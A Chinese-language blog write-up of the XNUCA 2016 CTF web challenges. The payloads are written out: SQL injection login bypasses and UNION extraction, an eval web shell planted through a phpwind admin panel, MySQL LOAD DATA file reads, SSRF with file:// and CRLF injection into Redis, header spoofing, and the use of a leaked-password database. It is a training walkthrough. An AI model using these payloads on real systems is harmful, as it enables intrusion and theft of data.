---
title: XNUCA2016 Writeup
date: 2016-08-01 10:23:42
tags:
- Blogs
- ctf
categories:
- Blogs
---

周末一个人打了中科院的XNUCA（小伙伴打着打着就不知道哪里去了...）,由于比较弱，最后也只能打到20多名，稍微整理下wp吧...

![](/img/xnuca/1.png)
<!--more-->

# Sign #

Good Luck！flag{X-nuca@GoodLuck!}

没啥可说的

# BaseCoding #

提示：这是编码不是加密哦!一般什么编码里常见等号？
这一串字符好奇怪的样子，里面会不会隐藏什么信息？http://question1.erangelab.com/

这种题目还需要提示.....base64解一下就好了

# BaseInjection #

提示：试试万能密码
不知道密码也能登录。http://question2.erangelab.com/

```
http://question2.erangelab.com/chklogin.php
username=admin'||1#&password=admin

flag{N1ce1njected}
```

# 4、BaseReconstruction #

提示：对数据包进行重构是基本技能
此题看似和上题一样，其实不然。http://question3.erangelab.com/

说实话我不知道有啥区别，payload和上面一样。

```
http://question3.erangelab.com/chklogin.php

username=admin'||1#&password=123

flag{Cr05sthEjava5cr1pt}
```

# 5、CountingStars #

提示：一不小心Mac也侧漏
No more $s counting stars. http://question4.erangelab.com/

其实看到里边的备注就猜到是mac的备份了

在mac中每个文件夹中都存在.DS_Store这个文件，会有部分当前文件夹的信息
```
http://question4.erangelab.com/.DS_Store
```

拿十六进制编辑器分析下就能发现`epLF1rEihQp5AjCUcgGry330jkFSC1C7.zip`

下载得到的居然是损坏的zip，那拖去linux binwalk一跑就得到了`index.php`

```
<?php
$S="song";
$song="says";
$says="no";
$no="more";
$more="d0llars";
$d0llars="counting";
$counting="star";
$star="S";
echo '<div style="text-align:center">What is $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S</div>';
?>
<br>
<br>
<br>
<div style="text-align:center">
<form action="check.php" method="post">
<input type="text" name="answer" value="" />  
<input type="submit" value="submit" />
</form>
<div>

```

没什么可说的，本地一输出就好了，得到`d0llars`

check会直接跳转，那么就curl一下吧

```
ubuntu@VM-181-46-ubuntu:~$ curl 'http://question4.erangelab.com/check.php' -H 'Host: question4.erangelab.com' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' --data 'answer=d0llars'

flag{whyD0lIarsA9ain!}

```


# 6、Invisible #

隐藏IP来保护自己。http://121.195.186.234

打开不知道要干什么，猜测是改xff，随便一改就过了...

# 7、Normal_normal #

提示：phpwind 后台getxxxxx
又是一个bbs。http://question6.erangelab.com/

看文章发现了邮箱`zhangrendao2008#126.com`

队友找到了一个社工裤，得到
```
帐号zhangrendao密码zhang2010
```

进入后台`http://question6.erangelab.com/admin.php`

在编辑模块的时候，发现其中有一个自定义html，可以直接写代码，那么我们就构造

```
<?php echo 'test';eval($_POST['a']) ?>
```
翻了翻找到外部调用的接口，这个接口是通过php文件包含实现的，那么我们的想法可行

```
http://question6.erangelab.com/index.php?m=design&c=api&token=MOw0mvL9kj&id=44&format=script
```
get shell
```
a=$username=file_get_contents('./flag-3g5WFxt7Fxp09C.txt');var_dump($username);
&csrf_token=e24bceb1c744db43

flag{n0rmal_meth0d_n0rmal_l1fe}
```

# 8、DBexplorer #

提示：a.SELECT @@datadir 。。。mysql/user.MYD b.user.MYD
Where is my data。http://question7.erangelab.com/（请不要修改密码！）

进去发现了`.db.php.swp`,得到当前账户的号和密码，然后发现了phpmyadmin

```
username:ctfdb	password:ctfmysql123
```

通过`SELECT @@datadir`，我们可以得到mysql的路径是`/var/lib/mysql/`

配合网上的搜索，文件的路径是`/var/lib/mysql/mysql/user.MYD`

进去发现可以使用table q来读取文件内容数据，使用load_file并不能读到数据...(没有搞明白为什么)

后来发现了load data命令，这里还踩了坑,关于是否使用local的

[http://blog.csdn.net/youngerchen/article/details/7881678](http://blog.csdn.net/youngerchen/article/details/7881678)

最终payload：
```
LOAD DATA INFILE '/var/lib/mysql/mysql/user.MYD' INTO TABLE q fields terminated by 'LINES' TERMINATED BY '\0' 
```

有一个别的账户，登陆进去就是flag

# 9、RotatePicture #

提示：urlopen file schema
转转转。http://question8.erangelab.com/picrotate

题目是传入一张图片，会返回倒着的图片。

测试不难发现这个接口可以扫描内网，并支持伪协议，那说明我们可以巧妙地构造ssrf来进行攻击...

通过file协议我们可以读文件，但是只能读一行。。。
```
file:///etc/passwd
```
看源码，发现有提示`views.py`
```
file:///views.py
```

我们得到
```
http://question8.erangelab.com/getredisvalue
```
发现内网6379端口开着redis，那我们可以通过`Python urllib HTTP头注入漏洞`来攻击内网的redis。

这里有两篇文章
[https://virusdefender.net/index.php/archives/749](https://virusdefender.net/index.php/archives/749)
[https://security.tencent.com/index.php/blog/msg/106](https://security.tencent.com/index.php/blog/msg/106)

但是不知道怎么写的，各种报错，还有过长的判断，强行set值看看。
```
http://127.0.0.1%0d%0aset%20c46fb8d3-6322-42ba-8919-dc4b914714db%2012345%0d%0a:6379
```
中间就是getredisvalue拿到的`uuid`，查询刷新就拿到flag了。

```
flag{url0pen_1s_1nterest1ng}
```

# 10、AdminLogin #

On the way in。http://121.195.186.238/index.php

首先注入，虽然不知道出题人脑子有没有坑，但是带着referer就好了

```
http://question9.erangelab.com/news.php?newsid=2 union select 1,SCHEMA_NAME,3 from information_schema.SCHEMATA  limit 1,1%23

referer：
http://question9.erangelab.com/index.php
```

注入得到admin的号密
```
ctfphp
	>admin ; news
		>id,name,pass ; id,title,content

ctfadmin
```

admin
administrat0r

然后找到robots.txt
```
robots.txt

# robots.txt generated at http://tool.chinaz.com/robots/ 
User-agent: *
Disallow: 
Disallow: /xnucactfwebadmin/
Disallow: /dbconfig/
Sitemap: http://domain.com/sitemap.xml
```

这里巨坑埋下了，这里的后台没有任何返回，然后后来改题却没有公告

```
http://121.195.186.238/xnucactfwebadmin/logincheck.php

传入username&password&submit，然后修改xff为8.8.8.8就好了

flag{U2NCF8yaniq5WirEE2wumYIfbrxcEiU2}
```

# OneWayIn #

How can I get in。http://question11.erangelab.com/

```
http://question11.erangelab.com/index.php
```

做这题的时候感觉自己是个智障...进去居然没有发现源码，但无意中过了判断...

```
0_username[]=admin
&0_pwd[]=admin’
&submit=Submit
```

返回了一大堆16进制的东西....导致我没注意到其实已经发生了跳转...就不能好好返回个要做什么吗？？？

```
http://question11.erangelab.com/flag_manager/index.php?file=dGVzdC50eHQ=&num=
```

我们可以通过base64编码文件名，然后num一行一行读内容，python随便写个脚本就好了

```
<?php

    error_reporting(0);

    $file=base64_decode(isset($_GET['file'])?$_GET['file']:"");

        //

    $line=isset($_GET['num'])?intval($_GET['num']):0;

    if($file=='') header("location:index.php?file=dGVzdC50eHQ=&num=");

    $file_list = array(

        '0' =>'test.txt',

        '1' =>'index.php',

    );



        //

    if(isset($_COOKIE['role_cookie']) && $_COOKIE['role_cookie']=='flagadmin'){

        $file_list[2]='flag.php';

    }



        //

    if(in_array($file, $file_list)){

        $fa = file($file);

        echo $fa[$line];

    }

?>

```
由于出题人的脑洞大开，强行加难度，flag.php是有phpjiami加密过的，但是读文件的时候没有设置编码，然后读回来的文件都不完整，curl也是不完整，这里只有python读回来的是完整的...

淘宝2.5一解就好了